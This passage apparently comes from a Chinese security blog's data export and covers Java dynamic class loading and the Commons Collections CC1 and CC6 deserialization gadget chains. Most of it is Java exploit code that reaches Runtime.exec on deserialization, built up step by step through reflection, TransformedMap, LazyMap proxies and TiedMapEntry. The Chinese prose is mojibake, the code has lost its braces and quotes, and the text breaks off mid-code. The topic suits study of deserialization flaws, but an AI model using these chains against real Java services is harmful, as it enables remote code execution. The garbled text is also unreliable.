ï¼Œå¦åˆ™tmpå°†ä¸è¢«è®¤ä¸ºæ˜¯ç›®å½•çš„ä¸€éƒ¨åˆ†è€Œæ˜¯è¢«çœ‹åšjaråŒ…ï¼‰ ä½†æ˜¯å‘¢fileé‡Œé¢æˆ‘ä»¬æ˜¯æœ¬åœ°è°ƒç”¨ï¼Œä¸€èˆ¬æ˜¯æ²¡æœ‰ä»€ä¹ˆç”¨çš„ï¼Œä½†æ˜¯å‘¢æˆ‘ä»¬å¯ä»¥ç”¨httpåè®®æ¥ åœ¨tmpç›®å½•ä¸‹é¢èµ·ä¸€ä¸ªhttpæœåŠ¡ï¼špython -m http.server 9999 ç„¶åé€šè¿‡è¯¥urlåŠ è½½è¯¥ç›®å½•ä¸‹é¢çš„Testç±»ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ è¿™è¯´æ˜äº†æˆ‘ä»¬åŒæ ·å¯ä»¥è¿œç¨‹åŠ è½½ç±»ï¼Œå¤§å¤§å¢åŠ äº†æ”»å‡»é¢ defineClass()è§¦å‘åŠ¨æ€ç±»åŠ è½½ç•™æ„åˆ°defineClass()æ–¹æ³•åœ¨ClassLoaderç±»ä¸­æ˜¯å—ä¿æŠ¤çš„æ–¹æ³•ï¼Œå› æ­¤æƒ³è°ƒç”¨é¡»é€šè¿‡åå°„ å‡ ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç±»åï¼Œç¬¬äºŒä¸ªæ˜¯å­—èŠ‚ç ï¼Œç¬¬ä¸‰ä¸ªæ˜¯å­—èŠ‚ç èµ·å§‹è¯»å–ä½ï¼Œç¬¬å››ä¸ªæ˜¯è¯»å–é•¿åº¦ å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š package com.sherlock;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;public class ClassLoaderTest public static void main(String[] args) throws Exception ClassLoader cl = ClassLoader.getSystemClassLoader(); Method defineClass = ClassLoader.class.getDeclaredMethod(defineClass, String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); Class c = (Class)defineClass.invoke(cl, Test, code, 0, code.length); c.newInstance(); æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ï¼ŒæˆåŠŸå¼¹çª— ç”¨å¦ä¸€ç§defineClass()åŒæ ·å¯è¡Œï¼ˆæ— éœ€ç±»åï¼‰ package com.sherlock;import sun.misc.Unsafe;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class ClassLoaderTest public static void main(String[] args) throws Exception ClassLoader cl = ClassLoader.getSystemClassLoader(); Class c = Unsafe.class; Field theUnsafeField = c.getDeclaredField(theUnsafe); theUnsafeField.setAccessible(true); Unsafe unsafe = (Unsafe) theUnsafeField.get(null); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); Class c2 = (Class)unsafe.defineClass(Test, code, 0, code.length,cl,null); c2.newInstance(); ç›¸æ¯”URLClassLoaderï¼š ä¼˜ç‚¹ï¼šæ— éœ€å‡ºç½‘ ç¼ºç‚¹ï¼šdefineClassæ˜¯å—ä¿æŠ¤çš„ï¼Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ¯”è¾ƒå°‘è§ä¸€ä¸ªæ–¹æ³•ä¸­èƒ½å¤Ÿç›´æ¥è°ƒç”¨è¯¥æ–¹æ³•çš„ Java ä¸»è¦çš„ç±»åŠ è½½å™¨åŠå…¶ç»§æ‰¿å…³ç³»ä¸åŒäº²å§”æ´¾æµç¨‹ï¼Œå¯ä»¥ç›´è§‚åœ°ç†è§£ä¸ºï¼š å¼•ç”¨https://blog.potatowo.top/2024/09/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/","categories":["javaååºåˆ—åŒ–"]},{"title":"javaååºåˆ—åŒ–CommonsCollections","path":"/2024/10/24/javaååºåˆ—åŒ–CommonsCollections/","content":"å‰è¨€Commons Collections = 3.2.1jdk = 8u65 CC1å±é™©çš„æ–¹æ³•è°ƒç”¨ï¼šTransform.transform() Transformeræ¥å£ï¼Œè¯¥æ¥å£ä¸»è¦å°±æ˜¯å®šä¹‰äº†ä¸€ä¸ªæ¥å£æ–¹æ³•transform() ConstantTransformerç±»ï¼šConstantTransformerç±»ä¸­çš„transform()æ–¹æ³•ï¼š è¿”å›ä¸€ä¸ªå¸¸é‡ï¼Œè¯¥å¸¸é‡åœ¨æ„é€ æ–¹æ³•è°ƒç”¨çš„æ—¶å€™å°±ç¡®å®šäº†ï¼Œå› æ­¤ï¼Œåç»­ä¸ç®¡transform()æ–¹æ³•ä¼ å…¥ä»€ä¹ˆå¯¹è±¡ï¼Œéƒ½å°†è¿”å›æ„é€ å¯¹è±¡æ—¶æ„é€ æ–¹æ³•ä¼ å…¥çš„é‚£ä¸ªå¯¹è±¡ InvokerTransformeræˆ‘ä»¬å¯ä»¥æŸ¥çœ‹å®ç°è¿™ä¸ªæ¥å£çš„ç±»ï¼ˆideaä¸­é€‰ä¸­æ¥å£å+ctrl+hï¼‰ ç„¶ååœ¨å…¶ä¸­æœ‰ä¸€ä¸ªå®ç°ç±»ä¸ºInvokerTransformer.javaï¼Œå…¶ä¸­çš„transformæ–¹æ³•å¦‚ä¸‹ å¯ä»¥å‘ç°è¯¥æ–¹æ³•æ¥å—ä»»æ„ä¸€ä¸ªå¯¹è±¡å®ä¾‹ï¼Œè¿›è¡Œåå°„è°ƒç”¨æ‰§è¡Œä»»æ„æ–¹æ³• æ‰€ä»¥è®©æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹InvokerTransformerç±»çš„æ„é€ å‡½æ•°ï¼šæ¥æ”¶å‚æ•°åï¼Œå‚æ•°ç±»å‹ï¼Œå‚æ•°å€¼ æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ ChainedTransformerç±»ï¼šè¯¥ç±»çš„transform()æ–¹æ³•å®ç°äº†å¯¹å®ç°Transformeræ¥å£çš„å¯¹è±¡çš„transform()æ–¹æ³•çš„é“¾å¼è°ƒç”¨ï¼Œä¸Šä¸€ä¸ªtransform()è°ƒç”¨çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªtransform()è°ƒç”¨çš„è¾“å…¥ï¼š iTransformersæ•°ç»„æ˜¯åœ¨æ„é€ å‡½æ•°ä¸­èµ‹å€¼çš„ï¼Œæ˜¯ä¸€ä¸ªTransformerå¯¹è±¡æ•°ç»„ å†ç»“åˆä¸€ä¸‹ä¸Šé¢çš„InvokerTransformerä»¥åŠConstantTransformerï¼Œç”±äºä¸ç®¡ä¼ å…¥ä»€ä¹ˆConstantTransformeréƒ½è¿”å›æ–°å»ºå¯¹è±¡æ—¶æ„é€ å‡½æ•°ä¼ å…¥çš„é‚£ä¸ªå¯¹è±¡ï¼Œå› æ­¤è¿™é‡Œåœ¨è°ƒç”¨chainedTransformerçš„transform()æ–¹æ³•æ—¶éšä¾¿ä¼ äº†ä¸ªæ•´å‹å¯¹è±¡666è¿›å»ï¼Œä¹ŸæˆåŠŸå‡ºç°å¼¹çª—ï¼š package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;public class Test public static void main(String[] args) throws Exception //new InvokerTransformer(exec,new Class[]String.class,new Object[]calc).transform(Runtime.getRuntime()); Transformer[] transformers = new Transformer[] new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(exec,new Class[]String.class,new Object[]calc) ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(666); æ„é€ å®Œæ•´é“¾é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦æ‰¾å“ªé‡Œä¼šè°ƒç”¨Transformæ–¹æ³•ï¼Œå°±æ¯”å¦‚ç±»TransformedMapä¸­çš„checkSetValueæ–¹æ³•è°ƒç”¨äº†transformæ–¹æ³• ç„¶åæˆ‘ä»¬å°±è¦çœ‹çœ‹å‚æ•°valueTransformerï¼Œå»æŸ¥çœ‹è¯¥ç±»çš„æ„é€ å‡½æ•° è¯¥æ„é€ å‡½æ•°æ¥å—ä¸€ä¸ªMapï¼Œç„¶åå¯¹keyå’Œvalueè¿›è¡Œæ“ä½œ ä½†æ˜¯ä¸€ä¸ªprotectedæ–¹æ³•ï¼Œè¯´æ˜æ˜¯è¢«è‡ªå·±è°ƒç”¨çš„ï¼Œæˆ‘ä»¬ç»§ç»­æŸ¥æ‰¾ ä¸€ä¸ªé™æ€çš„æ–¹æ³•è°ƒç”¨äº†è¯¥æ„é€ å‡½æ•°ï¼Œå¯¹ä¼ è¿›æ¥çš„å‚æ•°è¿›è¡Œäº†è£…é¥°çš„ä½œç”¨ï¼ˆå¥½åƒæ²¡å•¥ç”¨ï¼‰ å› ä¸ºæˆ‘ä»¬æ˜¯è¦è°ƒç”¨è¯¥ç±»ä¸­çš„checkSetValueæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŸ¥æŸ¥å®ƒçš„ç”¨é€”ï¼Œå‘ç°åªæœ‰ä¸€ä¸ªç”¨æ³• è¿›å…¥ç±»ä¸­æŸ¥çœ‹æ–¹æ³•ï¼ŒsetValueæ–¹æ³•ç®€å•ç†è§£å°±æ˜¯è¦å¯¹ä¼ å…¥çš„é”®å€¼å¯¹ä¸­çš„å€¼è¿›è¡Œä¿®æ”¹ï¼Œè¿™é‡Œçš„æ–¹æ³•æ¥å—çš„å‚æ•°ä¸ºObject å› æ­¤æˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªMapç±»ï¼Œæˆ‘ä»¬æ˜¯è¦å¯¹valueTransformerå‚æ•°è¿›è¡Œæ“ä½œï¼Œæ‰€ä»¥keyTransformerå‚æ•°å€¼å¯ä»¥è®¾ä¸ºNULLï¼Œå› æ­¤é“¾å¯ä»¥æ„é€ å¦‚ä¸‹ï¼š package org.example;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class Main public static void main(String[] args) throws Exception Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(exec, new Class[]String.class, new Object[]calc); HashMapObject, Object map = new HashMap(); map.put(a, b); // è£…é¥° HashMapï¼Œä½¿å…¶åœ¨è®¾ç½®å€¼æ—¶æ‰§è¡Œ transform() MapObject, Object transformedMap = TransformedMap.decorate(map, null, invokerTransformer); for (Map.Entry entry : transformedMap.entrySet()) // è¿™é‡Œä¼šè§¦å‘ invokerTransformer çš„ transform()ï¼Œè°ƒç”¨ Runtime.exec(calc) entry.setValue(r); åˆ°ç°åœ¨æˆ‘ä»¬å·²ç»å®Œæˆä¸€åŠäº†ï¼Œä¸Šé¢è¯´æ˜äº†æˆ‘ä»¬åªè¦æ‰¾åˆ°ä¸€ä¸ªMap.Entryéå†æ•°ç»„å¹¶ä¸”è°ƒç”¨äº†setValueæ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠŠtransformedMapä¼ è¿›å»ï¼Œå®ç°å¼¹çª—ï¼ˆå½“ç„¶setValueçš„å€¼è¦å¯æ§ï¼‰ å› æ­¤ç°åœ¨æˆ‘ä»¬è¦æ‰¾ä¸åŒåçš„è°ƒç”¨setValueæ–¹æ³•çš„å‡½æ•°ï¼Œæœ€å¥½çš„å°±æ˜¯æ‰¾readObjecté‡Œé¢è°ƒç”¨è¯¥æ–¹æ³•çš„ æœ€ç»ˆæˆ‘ä»¬æ‰¾åˆ°äº†ï¼Œåœ¨AnnotationInvocationHandler.javaä¸­ è§‚å¯Ÿä¸‹è¯¥ç±»ä¸­æœ‰ä»€ä¹ˆå¯æ§çš„ï¼Œçœ‹çœ‹æ„é€ å‡½æ•°ï¼Œå¯ä»¥å‘ç°memberValuesæ˜¯å®Œå…¨å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠtransformedMapä¼ è¿›å» ç¬¬ä¸€ä¸ªå‚æ•°typeæ˜¯ç»§æ‰¿äº†Annotationï¼ˆæ³¨è§£ï¼‰çš„Classå¯¹è±¡ï¼Œä½†æ˜¯æ— ç¢ éœ€è¦æ³¨æ„çš„æ˜¯è¯¥ç±»ä¸æ˜¯publicï¼Œè€Œæ˜¯é»˜è®¤çš„ï¼Œä¹Ÿå°±æ˜¯åªèƒ½å¤Ÿåœ¨è‡ªå·±é‚£ä¸ªåŒ…é‡Œé¢è·å–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åå°„è°ƒç”¨ åˆæ­¥çš„ä»£ç å¦‚ä¸‹ï¼š package org.example;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class Main public static void main(String[] args) throws Exception Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(exec, new Class[]String.class, new Object[]calc); HashMapObject, Object map = new HashMap(); map.put(a, b); // è£…é¥° HashMapï¼Œä½¿å…¶åœ¨è®¾ç½®å€¼æ—¶æ‰§è¡Œ transform() MapObject, Object transformedMap = TransformedMap.decorate(map, null, invokerTransformer); Class c = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object o = ctor.newInstance(Override.class, transformedMap); serialize(o); unserialize(ser.bin); public static void serialize(Object obj) throws IOException ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(ser.bin)); oos.writeObject(obj); public static Object unserialize(String Filename) throws IOException, ClassNotFoundException ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; ä½†æ˜¯æœ‰å‡ ä¸ªé—®é¢˜æˆ‘ä»¬éœ€è¦è§£å†³ï¼Œå…ˆè§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼šRuntimeç±»ä¸èƒ½å¤Ÿè¢«åºåˆ—åŒ–ï¼Œå› ä¸ºå®ƒæ²¡æœ‰ç»§æ‰¿ç›¸å…³çš„Serializableç±»,æ‰€ä»¥æˆ‘ä»¬éœ€è¦åå°„è°ƒç”¨ Class c = Runtime.class;Method getRuntimeMethod = c.getMethod(getRuntime,null);Runtime r = (Runtime)getRuntimeMethod.invoke(null,null);Method execMethod = c.getMethod(exec,String.class);execMethod.invoke(r,calc); ä¸Šé¢æ˜¯æ™®é€šçš„åå°„è°ƒç”¨ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶æ”¹ä¸ºInvokerTransformerå½¢çš„ Method getRuntimeMethod = (Method)new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,null).transform(Runtime.class);//è·å¾—getRuntimeæ–¹æ³•Runtime r = (Runtime)new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null).transform(getRuntimeMethod);//è·å¾—Runtimeå¯¹è±¡new InvokerTransformer(exec, new Class[]String.class, new Object[]calc).transform(r);//å¼¹è®¡ç®—å™¨ è¿™æ ·å°±å·²ç»å°†å…¶æ”¹æˆå¯ä»¥åºåˆ—åŒ–çš„ç‰ˆæœ¬äº†ï¼Œè¿™æ—¶å€™å¯ä»¥å‘ç°ä¸Šé¢ç›¸å½“äºæ˜¯transformæ–¹æ³•çš„å¾ªç¯è°ƒç”¨ï¼Œæ‰€ä»¥è”æƒ³åˆ°äº†ChainedTransformer Transformer[] transformers = new Transformer[] new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,null), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec, new Class[]String.class, new Object[]calc);ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); æ‰€ä»¥ç°åœ¨çš„ä»£ç å¦‚ä¸‹ï¼š package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class Main public static void main(String[] args) throws Exception Transformer[] transformers = new Transformer[] new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,null), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec, new Class[]String.class, new Object[]calc) ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMapObject, Object map = new HashMap(); map.put(a, b); // è£…é¥° HashMapï¼Œä½¿å…¶åœ¨è®¾ç½®å€¼æ—¶æ‰§è¡Œ transform() MapObject, Object transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class c = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object o = ctor.newInstance(Override.class, transformedMap); serialize(o); unserialize(ser.bin); public static void serialize(Object obj) throws IOException ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(ser.bin)); oos.writeObject(obj); public static Object unserialize(String Filename) throws IOException, ClassNotFoundException ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; ä½†æ˜¯ç°åœ¨ä»£ç è¿˜æ˜¯æ‰§è¡Œä¸äº†ï¼Œæˆ‘ä»¬é€‰æ–­ç‚¹è°ƒä¸€ä¸‹çœ‹èƒ½ä¸èƒ½èµ°è¿›readObjectçš„setValueæ–¹æ³•é‡Œé¢ è°ƒçš„æ—¶å€™å‘ç°memberTypeNullï¼Œæ‰€ä»¥ä¼šç›´æ¥èµ°ä¸åˆ° è°ƒè¯•ä»£ç çš„æ—¶å€™å¯ä»¥çŸ¥é“nameçš„å€¼æ˜¯memberValuesé”®å€¼å¯¹ä¸­çš„é”®ï¼ŒmemberTypeè¿”å›åœ¨memberTypesæ˜¯å¦æŸ¥æ‰¾åˆ°keyï¼ŒmemberTypesåˆ™æ˜¯ç¬¬ä¸€ä¸ªå˜é‡ï¼ˆæ³¨è§£ï¼‰çš„æˆå‘˜æ–¹æ³• ä¹Ÿå°±æ˜¯è¯´ç¬¬ä¸€ä¸ªå˜é‡æˆ‘ä»¬å¿…é¡»æŸ¥æ‰¾æœ‰æˆå‘˜å˜é‡çš„Classï¼ŒåŒæ—¶æ•°ç»„çš„keyè¿˜è¦æ”¹æˆå…¶æˆå‘˜æ–¹æ³•çš„åå­— ä»£ç å˜åŠ¨å¦‚ä¸‹ï¼š map.put(value, b);Object o = ctor.newInstance(Target.class, transformedMap); å†è°ƒè¯•ä¸€æ¬¡ï¼ŒæˆåŠŸèµ°è¿›å»ï¼Œç»§ç»­è°ƒè¯•ä¸‹å»ï¼Œåˆ°setValueæ–¹æ³• è·Ÿè¿›è¿›å» ç»§ç»­è·Ÿè¿› å¯ä»¥å‘ç°å›åˆ°äº†æˆ‘ä»¬æœ€åˆçš„checkValueæ–¹æ³•ï¼Œä½†æ˜¯å…¶ä¸­çš„valueå€¼æˆ‘ä»¬ç¡®å®ä¸å¯æ§çš„ï¼Œæ€ä¹ˆåŠå‘¢ è¿˜è®°å¾—å‰é¢çš„ConstantTransformerç±»ï¼Œè¯¥ç±»çš„transformæ–¹æ³•æ— è®ºåé¢ä¼ å…¥çš„valueæ˜¯ä»€ä¹ˆï¼Œéƒ½å°†è¿”å›æ„é€ å¯¹è±¡æ—¶æ„é€ æ–¹æ³•ä¼ å…¥çš„é‚£ä¸ªå¯¹è±¡ æ‰€ä»¥æˆ‘ä»¬åªéœ€åœ¨transformersæ•°ç»„ä¸­ç¬¬ä¸€ä¸ªä½ç½®æ·»ä¸Šè¯¥ç±»ä¾¿å¯ä»¥äº† å› æ­¤æœ€ç»ˆçš„å®Œæ•´é“¾ä»£ç å¦‚ä¸‹ package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class Main public static void main(String[] args) throws Exception Transformer[] transformers = new Transformer[] new ConstantTransformer(Runtime.class), new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,null), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec, new Class[]String.class, new Object[]calc) ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMapObject, Object map = new HashMap(); map.put(value, b); MapObject, Object transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class c = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object o = ctor.newInstance(Target.class, transformedMap); serialize(o); unserialize(ser.bin); public static void serialize(Object obj) throws IOException ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(ser.bin)); oos.writeObject(obj); public static Object unserialize(String Filename) throws IOException, ClassNotFoundException ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; æ‰§è¡Œçš„è¯ä¼šæˆåŠŸå¼¹è®¡ç®—å™¨ CC6LazyMapç±»ä¹‹å‰æˆ‘ä»¬åœ¨æ‰¾å“ªé‡Œæœ‰è°ƒç”¨transformæ–¹æ³•çš„æ—¶å€™é™¤äº†TransformedMapå¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªLazyMapä¸­çš„getæ–¹æ³•è°ƒç”¨äº†transformæ–¹æ³• æˆ‘ä»¬æŸ¥çœ‹getæ–¹æ³•å¯ä»¥å‘ç°å…¶ä¸­çš„factoryå®Œå…¨å¯æ§ï¼Œåªéœ€è¦ä¼ å…¥ä¸€ä¸ªTransformerç±»çš„å‚æ•°å°±å¯ä»¥äº† å¼€å§‹å¾€å›æ‰¾å“ªé‡Œæœ‰è°ƒç”¨getæ–¹æ³•ï¼Œè¿™è¾¹çš„è¯æ¯”è¾ƒéš¾æ‰¾ï¼Œè¿˜æ˜¯åœ¨sunreflectannotationAnnotationInvocationHandler.javaæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬æœç´¢ä¸€ä¸‹è¯¥æ–‡ä»¶é‡Œé¢å“ªé‡Œæœ‰è°ƒç”¨getæ–¹æ³•ï¼Œå¹¶ä¸”è¿˜æ˜¯æˆ‘ä»¬å¯æ§çš„ã€æ¯”è¾ƒç®€å•çš„ï¼Œå¦‚ä¸‹æ˜¯ä½äºinvokeæ–¹æ³•ä¸­çš„ invokeæ–¹æ³•ä»€ä¹ˆæ—¶å€™ä¼šè°ƒç”¨å‘¢ï¼Œå°±æ˜¯åªè¦å¤–é¢æœ‰è°ƒç”¨æ–¹æ³•ï¼Œå°±éƒ½ä¼šè°ƒç”¨åˆ°invokeæ–¹æ³• æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåŠ¨æ€ä»£ç†annotationInvocationHandlerå¹¶è°ƒç”¨ä»»æ„çš„æ–¹æ³• AnnotationInvocationHandleråºåˆ—åŒ–ï¼Œç„¶ååœ¨å®ƒé‡Œé¢æ”¾ä¸€ä¸ªä»£ç†ï¼Œç„¶åä»£ç†é‡Œé¢æ”¾ä¸€ä¸ªLazyMapï¼ŒLazyMapé‡Œé¢å†æ”¾ä¸€ä¸ªChainedTransformer æˆ‘ä»¬ç°åœ¨çœ‹ä¸‹å‰é¢çš„ä»£ç è¦æ€æ ·æ‰èƒ½æ‰§è¡Œåˆ°getæ–¹æ³• é¦–å…ˆå¤–é¢æ‰§è¡Œçš„æ–¹æ³•ä¸èƒ½å¤Ÿæ˜¯åœˆå‡ºæ¥çš„é‚£å‡ ä¸ªæ–¹æ³•ï¼Œå¹¶ä¸”è¿˜å¿…é¡»æ˜¯è¿˜ä¸èƒ½å¤Ÿæœ‰å‚æ•°ï¼Œæœ‰å‚æ•°ä¼šç›´æ¥æŠ›å‡ºæŠ¥é”™ æ‰€ä»¥æˆ‘ä»¬çœ‹ä¸‹readObjecté‡Œé¢æœ‰æ²¡æœ‰è¿™ç§æ–¹æ³•ï¼Œå¾ˆå¹¸è¿æœ‰ä¸ªentrySetæ–¹æ³•ï¼ˆåˆ°æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨ï¼‰ æ‰€ä»¥æˆ‘ä»¬æµ‹è¯•çš„ä»£ç å¦‚ä¸‹ï¼š package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class Main public static void main(String[] args) throws Exception Transformer[] transformers = new Transformer[] new ConstantTransformer(Runtime.class), new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,null), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec, new Class[]String.class, new Object[]calc) ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMapObject, Object map = new HashMap(); MapObject, Object lazyMap = LazyMap.decorate(map, chainedTransformer); Class c = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); InvocationHandler h = (InvocationHandler) ctor.newInstance(Override.class, lazyMap); Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]Map.class, h); Object o = ctor.newInstance(Override.class,mapProxy);// serialize(o); unserialize(ser.bin); public static void serialize(Object obj) throws IOException ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(ser.bin)); oos.writeObject(obj); public static Object unserialize(String Filename) throws IOException, ClassNotFoundException ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; ååºåˆ—åŒ–åæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼ŒreadObjectæ—¶çš„memberValuesçš„å€¼æ˜¯mapProxyï¼Œç„¶åå½“åˆ°invokeæ–¹æ³•çš„æ—¶å€™memberValuesçš„å€¼åˆ™æ˜¯lazyMap å¾ˆé—æ†¾çš„æ˜¯ä¸Šé¢ä¸¤ç§æ–¹æ³•åœ¨æ›´é«˜çš„jdkç‰ˆæœ¬ä¸­éƒ½ç”¨ä¸äº†äº†ï¼Œé‚£æœ‰æ²¡æœ‰ä¸€æ¡ä¸å—jdkç‰ˆæœ¬é™åˆ¶çš„é“¾å‘¢ï¼Œç­”æ¡ˆè‚¯å®šæ˜¯æœ‰çš„ï¼Œé‚£å°±æ˜¯CC6è¿™æ¡é“¾ TiedMapEntryç±»æˆ‘ä»¬å…³æ³¨TiedMapEntryç±»ï¼ŒæŸ¥çœ‹è¯¥ç±»ä¸­çš„hashCodeæ–¹æ³•ï¼ˆå°±æ˜¯ä¹‹å‰URLDNSé‚£æ¡é“¾çš„ï¼‰ æ–¹æ³•ä¸­è°ƒç”¨äº†getValueæ–¹æ³•ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼Œå‘ç°å®ƒè°ƒç”¨äº†getæ–¹æ³• å¹¶ä¸”å‚æ•°mapå¯æ§ï¼Œæˆ‘ä»¬åˆ°æ—¶å€™æ”¹æˆLazyMapå°±å¯ä»¥äº†ï¼Œè¿™æ ·å­å°±åˆå’Œä¸Šé¢çš„ååŠæ¡é“¾å¯¹ä¸Šäº† å…¶æ„é€ å‡½æ•°çš„å‚æ•°ä¸€ä¸ªæ˜¯mapï¼Œä¸€ä¸ªæ˜¯é”® æˆ‘ä»¬ç»§ç»­åˆ†æï¼Œæˆ‘ä»¬è¦æŠŠhashMapä½œä¸ºå…¥å£ç±»ï¼Œçœ‹åˆ°äº†å®ƒçš„readObject()æ–¹æ³•è°ƒç”¨äº†hashæ–¹æ³• ç»§ç»­è·Ÿè¿›ï¼Œå‘ç°hashæ–¹æ³•é‡Œé¢è°ƒç”¨äº†hashCodeæ–¹æ³•ï¼Œhashçš„å‚æ•°æ˜¯keyï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŠŠTiedMapEntryç±»çš„å¯¹è±¡æ”¾åœ¨hashMapçš„é”®å¤„ æ‰€ä»¥æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š public class Main public static void main(String[] args) throws Exception Transformer[] transformers = new Transformer[] new ConstantTransformer(Runtime.class), new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,null), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec, new Class[]String.class, new Object[]calc) ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMapObject, Object map = new HashMap(); //map.put(value, 222); //å¯åŠ å¯ä¸åŠ  MapObject, Object lazyMap = LazyMap.decorate(map, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, aaa); HashMapObject, Object map2 = new 